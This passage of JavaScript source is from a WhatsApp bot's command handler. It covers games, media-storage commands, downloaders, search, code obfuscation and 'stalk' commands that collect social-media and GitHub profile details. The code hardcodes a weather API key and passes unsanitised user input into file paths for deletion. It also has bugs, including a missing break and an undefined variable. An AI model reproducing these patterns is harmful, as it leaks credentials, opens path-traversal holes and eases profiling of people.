                this.suit[id] = {
                    chat: await EliteProEmpire.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) EliteProEmpire.sendText(m.chat, `_Suit time is up_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) reply(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./lib/math.js')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                EliteProEmpire.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    reply("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
            }
            break	
            case 'openai-indo': {
	            if (!q) return reply(`Example : ${prefix + command} who is ronaldo`)
			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			      var isi = isiai.result
		         await reply(isi)
			   }
			   break
    case 'xxqc': {
if (!q) return reply(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return reply(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return reply('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await EliteProEmpire.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
EliteProEmpire.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
    case 'ephemeral': {
                if (!m.isGroup) return reply("This command is for group use only.")
                if (!isBotAdmins) return reply("Bot needs admin privileges.")
                if (!isAdmins) return reply("This command is made for admins.")
                if (!text) return reply('Enter the value on/off')
                if (args[0] === 'on') {
                    await EliteProEmpire.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await reply(`Done`)
                } else if (args[0] === 'off') {
                    await EliteProEmpire.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await reply(`Done`)
                }
            }
            break
            case 'delete': case 'del': case 'd': {
              if (!isAdmins && !isGroupOwner && !XeonTheCreator) return reply('This features can only be used by me or admins')
              let key = {}
              try {
                key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
                key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
                key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
                key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
              } catch (e) {
                console.error(e)
              }
              EliteProEmpire.sendMessage(m.chat, { delete: key })
            }
break
    case 'autoswview':
    case 'autostatusview':{
             if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  antiswview = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  reply(`${command} is disabled`)
               }
            }
            break
    case 'anticall': {
             if (!XeonTheCreator) return reply("This command is only made for my owner.")
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  anticall = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  anticall = false
                  reply(`${command} is disabled`)
               }
            }
            break
             break
case 'addvideo':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Whats the video name?')
if (VideoXeon.includes(q)) return reply("The name is already in use")
let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./EliteProMedia/video/${q}.mp4`)
fs.writeFileSync('./EliteProMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
reply(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Enter the video name')
if (!VideoXeon.includes(q)) return reply("The name does not exist in the database")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./EliteProMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./EliteProMedia/video/${q}.mp4`)
reply(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
reply(teks)
}
break
case 'addimage':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Whats the image name?')
if (ImageXeon.includes(q)) return reply("The name is already in use")
let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./EliteProMedia/image/${q}.jpg`)
fs.writeFileSync('./EliteProMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
reply(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Enter the image name')
if (!ImageXeon.includes(q)) return reply("The name does not exist in the database")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./EliteProMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./EliteProMedia/image/${q}.jpg`)
reply(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
reply(teks)
}
break
case 'addsticker':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Whats the sticker name?')
if (StickerXeon.includes(q)) return reply("The name is already in use")
let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./EliteProMedia/sticker/${q}.webp`)
fs.writeFileSync('./EliteProMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
reply(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Enter the sticker name')
if (!StickerXeon.includes(q)) return reply("The name does not exist in the database")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./EliteProMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./EliteProMedia/sticker/${q}.webp`)
reply(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
reply(teks)
}
break
case 'addmsg': {
	if (!XeonTheCreator) return reply("This command is only made for my owner.")
                if (!m.quoted) return reply('Reply Message You Want To Save In Database')
                if (!text) return reply(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return reply(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return reply(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return reply(`'${text}' not listed in the message list`)
                EliteProEmpire.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!XeonTheCreator) return reply("This command is only made for my owner.")
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'addvn':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Whats the audio name?')
if (VoiceNoteXeon.includes(q)) return reply("The name is already in use")
let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./EliteProMedia/audio/${q}.mp3`)
fs.writeFileSync('./EliteProMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
reply(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (args.length < 1) return reply('Enter the vn name')
if (!VoiceNoteXeon.includes(q)) return reply("The name does not exist in the database")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./EliteProMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./EliteProMedia/audio/${q}.mp3`)
reply(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
reply(teks)
}
break
case 'addzip':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")

if (args.length < 1) return reply(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return reply("This name is already in use")
let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./EliteProMedia/zip/${teks}.zip`)
fs.writeFileSync('./EliteProMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
reply(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")

if (args.length < 1) return reply('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return reply("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./EliteProMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./EliteProMedia/zip/${teks}.zip`)
reply(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
reply(teksooooo)
}
break
case 'addapk':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")

if (args.length < 1) return reply('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return reply("This name is already in use")
let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./EliteProMedia/apk/${teks}.apk`)
fs.writeFileSync('./EliteProMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
reply(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")

if (args.length < 1) return reply('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return reply("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./EliteProMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./EliteProMedia/apk/${teks}.apk`)
reply(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
reply(teksoooooo)
}
break
case 'addpdf':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")

if (args.length < 1) return reply('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return reply("This name is already in use")
let delb = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
DocXeon.push(teks)
await fsx.copy(delb, `./EliteProMedia/doc/${teks}.pdf`)
fs.writeFileSync('./EliteProMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
reply(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!XeonTheCreator) return reply("This command is only made for my owner.")

if (args.length < 1) return reply('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return reply("This name does not exist in the database")
let wanu = DocXeon.indexOf(teks)
DocXeon.splice(wanu, 1)
fs.writeFileSync('./EliteProMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./EliteProMedia/doc/${teks}.pdf`)
reply(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocXeon) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`
reply(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
EliteProEmpire_dev = await getBuffer(`https://github.com/Cyrilix-XMD/CYRILIX-STORE/raw/main/TiktokMusic/${command}.mp3`)
await EliteProEmpire.sendMessage(m.chat, { audio: EliteProEmpire_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
await XeonStickWait()
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
reply('Managed to Get One Person')
}, 5000)
setTimeout(() => {
EliteProEmpire.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply the Message!!')
let xeonquotx= await EliteProEmpire.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return reply('The message you are replying to is not sent by the bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus': case 'obfuscate': case 'encrypte': {
if (!q) return reply(`Example ${prefix+command} const elitepro = require('baileys')`)
let meg = await obfus(q)
reply(`*DONE ENCRYPTING CODES*
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper.js')
		if (!text) return reply('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
case 'yts': case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} Alan walker alone`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                EliteProEmpire.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
break
case 'git': case 'gitclone':
if (!args[0]) return reply(`${prefix}${command} https://github.com/Elite-MD/ELITE-PRO-V2`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    EliteProEmpire.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
case 'tiktokvideo':
case 'tiktokmp4': {
if (!q) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok.js').Tiktok(q).then( data => {
EliteProEmpire.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokmp3':
case 'tiktokaudio':{
if (!q) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./lib/tiktok.js').Tiktok(q).then( data => {
const xeontikmp3 = {url:data.audio}
EliteProEmpire.sendMessage(m.chat, { audio: xeontikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
})
}
break
case'ttslide': case 'tiktokslide':{
if (!text) return reply(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
EliteProEmpire.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`)
await EliteProEmpire.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'google': {
if (!q) return reply(`Example : ${prefix + command} ${botname}`)
await XeonStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'weather':{
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           EliteProEmpire.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'facebook2': case 'fb2':{
if (!text) return reply(`Enter the link!!!`)
if (!isUrl(args[0])) return reply(`Where is the link?`)
await EliteProEmpire.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
try{
let anu = await fetchJson(`https://aemt.me/download/fbdown?url=${text}`)
EliteProEmpire.sendMessage(m.chat, { video: { url: anu.result.url.urls[0].hd }, caption: 'Here you go!' }, { quoted: m })
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
  break
case 'tiktokstalk': {
	  if (!text) return reply(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await EliteProEmpire.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'xxxigstalk': {
if (!text) return reply(`Enter Instagram Username\n\nExample: ${prefix + command} unicorn_xeon13`)
    let res = await fg.igStalk(text)
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await EliteProEmpire.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return reply(`Example ${prefix+command} ElitePro`)
await XeonStickWait()
let githubstalk = require('./lib/scraper.js')
aj = await githubstalk.githubstalk(`${q}`)
EliteProEmpire.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} xeonapi`)
await XeonStickWait()
let npmstalk = require('./lib/scraper.js')
eha = await npmstalk.npmstalk(q)
reply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return reply(`Example ${prefix+command} 946716486`)
await XeonStickWait()
let ffstalk = require('./lib/scraper.js')
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
if (!q) return reply(`Example ${prefix+command} 530793138|8129`)
await XeonStickWait()
let mlstalk = require('./lib/scraper.js')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
